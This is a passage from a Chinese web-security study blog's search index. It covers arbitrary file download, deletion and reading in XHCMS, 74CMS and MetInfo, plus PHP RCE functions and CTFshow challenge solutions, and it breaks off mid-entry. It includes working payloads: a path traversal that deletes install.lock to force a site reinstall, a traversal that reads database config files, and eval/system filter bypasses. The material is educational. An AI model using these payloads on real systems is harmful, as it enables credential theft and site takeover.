<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SEC-2022版-0031-WEB攻防-22-通用漏洞之任意文件下载&amp;删除重装&amp;敏感读取&amp;黑白审计</title>
      <link href="/2023/07/04/SEC-Study-0060/"/>
      <url>/2023/07/04/SEC-Study-0060/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点-很难碰到"><a href="#知识点-很难碰到" class="headerlink" title="知识点(很难碰到)"></a>知识点(很难碰到)</h1><p>文件读取和文件下载：主要是获取网站敏感文件(对后期安全测试有所帮助)(数据库配置文件，接口配置文件，账户配置文件，操作系统敏感文件，口令密码等，网站自身的敏感文件)。</p><ul><li><p>文件读取：基本和文件下载利用类似</p></li><li><p>文件下载：利用下载获取源码或数据库配置文件及系统敏感文件为后续出思路</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">直连下载：(没有安全问题)</span><br><span class="line">http:<span class="comment">//xxx.xxx.com/2.zip</span></span><br><span class="line">无法直连下载：</span><br><span class="line">http:<span class="comment">//xxx.xxx.com/index.php</span></span><br><span class="line"></span><br><span class="line">可能存在安全问题</span><br><span class="line">http:<span class="comment">//xxx.xxx.com/?down=1.zip</span></span><br><span class="line">代码使用下载协议尝试下载解析文件</span><br><span class="line">http:<span class="comment">//xxx.xxx.com/?down=index.php</span></span><br></pre></td></tr></table></figure></li><li><p>文件删除：除自身安全引发的文件删除外，可配合删除重装锁定文件进行重装(高危操作，慎用。可以删除网站的锁定文件，重新安装网站。)</p></li></ul><p>➢审计分析-文件下载-XHCMS-功能点<br>➢审计分析-文件读取-MetInfo-函数搜索<br>➢审计分析-文件删除-74CMS-函数搜索<br>➢黑盒分析-下载读取-下载资源URL参数</p><h1 id="白盒审计-XHCMS"><a href="#白盒审计-XHCMS" class="headerlink" title="白盒审计(XHCMS)"></a>白盒审计(XHCMS)</h1><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>下载漏洞 :=&gt; 任意文件下载:下载谁 下载文件能不能控制 == 漏洞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;inc/conn.php&#x27;</span>;</span><br><span class="line"><span class="variable">$line</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]);</span><br><span class="line"><span class="variable">$type</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;type&#x27;</span>]);</span><br><span class="line"><span class="variable">$fileid</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cid&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$fileid</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;错误的下载请求！&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.通过ID查数据库取出文件相关的所有信息</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM download WHERE ( id=&#x27;<span class="subst">$fileid</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="comment"># 2.执行SQL查询</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="comment"># 3.获取查询数组</span></span><br><span class="line"><span class="variable">$down</span>= <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment"># 4.获取文件存储地址（存储在服务器上的物理地址或者远程的文件地址）（突破口）</span></span><br><span class="line"><span class="variable">$fileadd</span>=<span class="variable">$down</span>[<span class="string">&#x27;softadd&#x27;</span>];</span><br><span class="line"><span class="comment"># 获取网盘的下载</span></span><br><span class="line"><span class="variable">$fileadd2</span>=<span class="variable">$down</span>[<span class="string">&#x27;softadd2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$type</span>==<span class="string">&#x27;soft&#x27;</span> AND <span class="variable">$line</span>==<span class="string">&#x27;pan&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$fileadd2</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script language=JavaScript&gt;alert(&#x27;抱歉，程序尚在开发当中，请稍后再试！&#x27;);history.back();window.close();&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下载计数</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;UPDATE download SET xiazai = xiazai+1 WhERE id=&#x27;<span class="subst">$fileid</span>&#x27;&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;修改错误：&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>()); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$fileadd2</span>&quot;</span>); </span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件下载部分</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$type</span>==<span class="string">&#x27;soft&#x27;</span> <span class="title function_ invoke__">AND</span> (<span class="variable">$line</span>==<span class="string">&quot;telcom&quot;</span> OR <span class="variable">$line</span>==<span class="string">&quot;unicom&quot;</span>))&#123;</span><br><span class="line">    <span class="comment"># 文件标题和版本</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$down</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">    <span class="variable">$filename2</span>=<span class="variable">$down</span>[<span class="string">&#x27;version&#x27;</span>];</span><br><span class="line">    <span class="comment"># 将文件名从UTF8转GBK</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;GBK&quot;</span>, <span class="variable">$filename</span>);</span><br><span class="line">    <span class="comment"># 取出最后一个点的位置，按照位置切割字符串，取出文件后缀</span></span><br><span class="line">    <span class="variable">$houzhui</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$fileadd</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$fileadd</span>,<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sourceFile</span> = <span class="variable">$fileadd</span>; <span class="comment">//要下载的临时文件名</span></span><br><span class="line">    <span class="variable">$outFile</span> = <span class="variable">$filename</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$filename2</span>.<span class="variable">$houzhui</span>; <span class="comment">//下载保存到客户端的文件名</span></span><br><span class="line">    <span class="comment"># 返回扩展名，如：.txt返回txt</span></span><br><span class="line">    <span class="variable">$file_extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$sourceFile</span>, <span class="string">&quot;.&quot;</span>), <span class="number">1</span>)); <span class="comment">//获取文件扩展名</span></span><br><span class="line">    <span class="comment">//echo $sourceFile;</span></span><br><span class="line">    <span class="comment">//if (!ereg(&quot;[tmp|txt|rar|pdf|doc]&quot;, $file_extension))exit (&quot;非法资源下载&quot;);</span></span><br><span class="line">    <span class="comment">//检测文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$sourceFile</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=JavaScript&gt;alert(&#x27;抱歉，本地下载未发现文件，请选择网盘下载！&#x27;);history.back();window.close();&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$sourceFile</span>); <span class="comment">//获取文件大小</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$sourceFile</span>); <span class="comment">//获取文件名字</span></span><br><span class="line">    <span class="variable">$outFile_extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$outFile</span>, <span class="string">&quot;.&quot;</span>), <span class="number">1</span>)); <span class="comment">//获取文件扩展名</span></span><br><span class="line">    <span class="comment">//根据扩展名 指出输出浏览器格式</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$outFile_extension</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;exe&quot;</span> :</span><br><span class="line">            <span class="variable">$ctype</span> = <span class="string">&quot;application/octet-stream&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;zip&quot;</span> :</span><br><span class="line">            <span class="variable">$ctype</span> = <span class="string">&quot;application/zip&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;mp3&quot;</span> :</span><br><span class="line">            <span class="variable">$ctype</span> = <span class="string">&quot;audio/mpeg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;mpg&quot;</span> :</span><br><span class="line">            <span class="variable">$ctype</span> = <span class="string">&quot;video/mpeg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;avi&quot;</span> :</span><br><span class="line">            <span class="variable">$ctype</span> = <span class="string">&quot;video/x-msvideo&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span> :</span><br><span class="line">            <span class="variable">$ctype</span> = <span class="string">&quot;application/force-download&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Begin writing headers</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Cache-Control:&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Cache-Control: public&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置输出浏览器格式</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: <span class="subst">$ctype</span>&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="variable">$outFile</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Accept-Ranges: bytes&quot;</span>);</span><br><span class="line">    <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$sourceFile</span>);</span><br><span class="line">    <span class="comment">//如果有$_SERVER[&#x27;HTTP_RANGE&#x27;]参数</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_RANGE&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">/*Range头域 　　Range头域可以请求实体的一个或者多个子范围。</span></span><br><span class="line"><span class="comment">        例如，</span></span><br><span class="line"><span class="comment">        表示头500个字节：bytes=0-499</span></span><br><span class="line"><span class="comment">        表示第二个500字节：bytes=500-999</span></span><br><span class="line"><span class="comment">        表示最后500个字节：bytes=-500</span></span><br><span class="line"><span class="comment">        表示500字节以后的范围：bytes=500- 　　</span></span><br><span class="line"><span class="comment">        第一个和最后一个字节：bytes=0-0,-1 　　</span></span><br><span class="line"><span class="comment">        同时指定几个范围：bytes=500-600,601-999 　　</span></span><br><span class="line"><span class="comment">        但是服务器可以忽略此请求头，如果无条件GET包含Range请求头，响应会以状态码206（PartialContent）返回而不是以200 （OK）。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// 断点后再次连接 $_SERVER[&#x27;HTTP_RANGE&#x27;] 的值 bytes=4390912-</span></span><br><span class="line">        <span class="comment"># 获取数据包的Range字段</span></span><br><span class="line">        <span class="keyword">list</span> (<span class="variable">$a</span>, <span class="variable">$range</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;=&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_RANGE&#x27;</span>]);</span><br><span class="line">        <span class="comment">//if yes, download missing part</span></span><br><span class="line">        <span class="comment"># 将所有的$range里面的$rang替换为&quot;-&quot;???</span></span><br><span class="line">        <span class="title function_ invoke__">str_replace</span>(<span class="variable">$range</span>, <span class="string">&quot;-&quot;</span>, <span class="variable">$range</span>); <span class="comment">//这句干什么的呢。。。。</span></span><br><span class="line">        <span class="variable">$size2</span> = <span class="variable">$size</span> -<span class="number">1</span>; <span class="comment">//文件总字节数</span></span><br><span class="line">        <span class="variable">$new_length</span> = <span class="variable">$size2</span> - <span class="variable">$range</span>; <span class="comment">//获取下次下载的长度</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 206 Partial Content&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length: <span class="subst">$new_length</span>&quot;</span>); <span class="comment">//输入总长</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Range: bytes <span class="subst">$range</span><span class="subst">$size2</span>/<span class="subst">$size</span>&quot;</span>); <span class="comment">//Content-Range: bytes 4908618-4988927/4988928   95%的时候</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//第一次连接</span></span><br><span class="line">        <span class="variable">$size2</span> = <span class="variable">$size</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Range: bytes 0-<span class="subst">$size2</span>/<span class="subst">$size</span>&quot;</span>); <span class="comment">//Content-Range: bytes 0-4988927/4988928</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length: &quot;</span> . <span class="variable">$size</span>); <span class="comment">//输出总长</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//打开文件  </span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;<span class="subst">$sourceFile</span>&quot;</span>, <span class="string">&quot;rb&quot;</span>);  </span><br><span class="line"><span class="comment">//设置指针位置  </span></span><br><span class="line"><span class="title function_ invoke__">fseek</span>(<span class="variable">$fp</span>, <span class="variable">$range</span>);  </span><br><span class="line"><span class="comment">//虚幻输出  </span></span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;  </span><br><span class="line">    <span class="comment">//设置文件最长执行时间  </span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">print</span> (<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">1024</span> * <span class="number">8</span>)); <span class="comment">//输出文件  </span></span><br><span class="line">    <span class="title function_ invoke__">flush</span>(); <span class="comment">//输出缓冲  </span></span><br><span class="line">    <span class="title function_ invoke__">ob_flush</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line"><span class="comment">//下载计数</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;UPDATE download SET xiazai = xiazai+1 WhERE id=&#x27;<span class="subst">$fileid</span>&#x27;&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;修改错误：&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>()); </span><br><span class="line"><span class="keyword">exit</span> (); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>流程-功能点抓包-寻代码文件-寻变量控制-构造测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Payload: </span><br><span class="line">    softadd=d:/<span class="number">1</span>.txt </span><br><span class="line">    softadd2=d:/<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><h2 id="文件删除：74CMS-配合删除重装"><a href="#文件删除：74CMS-配合删除重装" class="headerlink" title="文件删除：74CMS-配合删除重装"></a>文件删除：74CMS-配合删除重装</h2><p>功能点或函数<br>    流程-特定函数搜索-寻触发调用-构造Payload测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">upload/admin/admin_article.php:<span class="number">169</span></span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$act</span> == <span class="string">&#x27;del_img&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">check_token</span>();</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$img</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;update &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;article&#x27;</span>).<span class="string">&quot; set Small_img=&#x27;&#x27; where id=&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot; LIMIT 1&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$upfiles_dir</span>.<span class="variable">$img</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$thumb_dir</span>.<span class="variable">$img</span>);</span><br><span class="line"><span class="title function_ invoke__">adminmsg</span>(<span class="string">&quot;删除缩略图成功！&quot;</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upload/admin/<span class="keyword">include</span>/admin_common.inc.php:<span class="number">48</span></span><br><span class="line"><span class="variable">$upfiles_dir</span>=<span class="string">&quot;../data/&quot;</span>.<span class="variable">$_CFG</span>[<span class="string">&#x27;updir_images&#x27;</span>].<span class="string">&quot;/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除操作，删除data目录下的文件</span></span><br><span class="line">Payload: /admin/admin_article.php?act=del_img&amp;img=../../data/install.lock</span><br></pre></td></tr></table></figure><h2 id="文件读取：MetInfo-任意读取"><a href="#文件读取：MetInfo-任意读取" class="headerlink" title="文件读取：MetInfo-任意读取"></a>文件读取：MetInfo-任意读取</h2><p>流程-特定函数搜索-寻触发调用-构造Payload测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MetInfo6.<span class="number">0.0</span></span><br><span class="line">app/system/<span class="keyword">include</span>/module/old_thumb.<span class="keyword">class</span>.php</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">old_thumb</span> <span class="keyword">extends</span> <span class="title">web</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;../&#x27;</span>,<span class="string">&#x27;./&#x27;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$_M</span>[<span class="string">&#x27;url&#x27;</span>][<span class="string">&#x27;site&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$dir</span>),<span class="number">0</span>,<span class="number">4</span>) == <span class="string">&#x27;http&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$dir</span>, <span class="string">&#x27;./&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/jpeg&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line">    <span class="title function_ invoke__">flush</span>();</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Payload：/<span class="keyword">include</span>/thumb.php?dir=http\..\..\config\config_db.php</span><br></pre></td></tr></table></figure><h1 id="黑盒探针"><a href="#黑盒探针" class="headerlink" title="黑盒探针"></a>黑盒探针</h1><p>1、URL参数名及参数值分析：<br>参数名：英文对应翻译<br>参数值：目录或文件名<br>2、功能点自行修改后分析：<br>文件下载，删除，读取等</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0032-WEB攻防-23-通用漏洞之RCE&amp;代码执行&amp;命令执行&amp;多层面检测利用</title>
      <link href="/2023/07/04/SEC-Study-0061/"/>
      <url>/2023/07/04/SEC-Study-0061/</url>
      
        <content type="html"><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>调用命令的漏洞：高危</p><p>1.为什么会产生此类安全问题<br>2.此类安全问题探针利用及危害<br>3.此类安全问题在CTF即CMS分析</p><p>漏洞场景：代码会调用自身的脚本代码执行，也会调用系统命令执行<br>漏洞区别：脚本语言&amp;操作系统(php/java/python/js&amp;windows/linux/mac)<br>漏洞对象：WEB源码&amp;中间件&amp;其他环境（见漏洞详情对象）<br>漏洞危害：直接权限丢失,可执行任意脚本代码或系统命令</p><h2 id="RCE-原理-amp-探针-amp-利用-amp-危害等"><a href="#RCE-原理-amp-探针-amp-利用-amp-危害等" class="headerlink" title="RCE-原理&amp;探针&amp;利用&amp;危害等"></a>RCE-原理&amp;探针&amp;利用&amp;危害等</h2><p>RCE 分为两类</p><ul><li><p>RCE代码执行：引用脚本代码解析执行</p><ul><li>把你接收过来的数据以当前脚本代码进行执行</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">将数据以代码进行执行</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>RCE命令执行：脚本调用操作系统命令</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">将数据以(系统命令)命令进行执行</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ul><p>和其它漏洞的区别：将字符串进行解析执行</p><p>危害：执行命令和代码。能读写文件。</p><p>黑盒探针RCE：难/几率小</p><p>大部分：基于白盒和网上爆出的RCE。</p><h2 id="漏洞函数：★★★★★★"><a href="#漏洞函数：★★★★★★" class="headerlink" title="漏洞函数：★★★★★★"></a>漏洞函数：★★★★★★</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.PHP：</span><br><span class="line">    运行代码：      <span class="keyword">eval</span>()、<span class="title function_ invoke__">assert</span>()、<span class="title function_ invoke__">preg_replace</span>()、<span class="title function_ invoke__">call_user_func</span>()、<span class="title function_ invoke__">call_user_func_array</span>()以及<span class="title function_ invoke__">array_map</span>()等</span><br><span class="line">    运行系统命令：   system, ``, shell_exec ,popen, passthru, proc_open等</span><br><span class="line"><span class="number">2</span>.Python：</span><br><span class="line">    <span class="keyword">eval</span> exec subprocess os.system commands </span><br><span class="line"><span class="number">3</span>.Java：</span><br><span class="line">    Java中没有类似php中<span class="keyword">eval</span>函数这种直接可以将字符串转化为代码执行的函数，</span><br></pre></td></tr></table></figure><p>但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="CTFshow-29-39-RCE代码命令执行"><a href="#CTFshow-29-39-RCE代码命令执行" class="headerlink" title="CTFshow-29~39-RCE代码命令执行"></a>CTFshow-29~39-RCE代码命令执行</h2><h3 id="29-通配符"><a href="#29-通配符" class="headerlink" title="29-通配符"></a>29-通配符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">原始：</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">    ?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac fla*.*&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="30-取代函数-amp-通配符-amp-管道符"><a href="#30-取代函数-amp-通配符-amp-管道符" class="headerlink" title="30-取代函数&amp;通配符&amp;管道符"></a>30-取代函数&amp;通配符&amp;管道符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">使用其他函数取代system</span><br><span class="line">原始：</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">payload1：</span><br><span class="line">    ?c=<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;tac fla*&#x27;</span>)</span><br><span class="line">payload2：</span><br><span class="line">    `cp fla*.ph* <span class="number">2</span>.txt`; ==&gt; 相当于system的作用</span><br><span class="line">    不过遗憾的是页面没有回显 ==&gt; `tac fla*`</span><br><span class="line">    最后访问<span class="number">2</span>.txt得到flag</span><br><span class="line">    /<span class="number">2</span>.txt</span><br></pre></td></tr></table></figure><h3 id="31-参数逃逸"><a href="#31-参数逃逸" class="headerlink" title="31-参数逃逸"></a>31-参数逃逸</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">原始：</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">payload：</span><br><span class="line">    过滤c参数的值，但不过滤<span class="number">1</span>参数的值</span><br><span class="line">    ?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="32-36-配合包含-amp-伪协议"><a href="#32-36-配合包含-amp-伪协议" class="headerlink" title="32~36-配合包含&amp;伪协议"></a>32~36-配合包含&amp;伪协议</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">32</span>原始：</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span 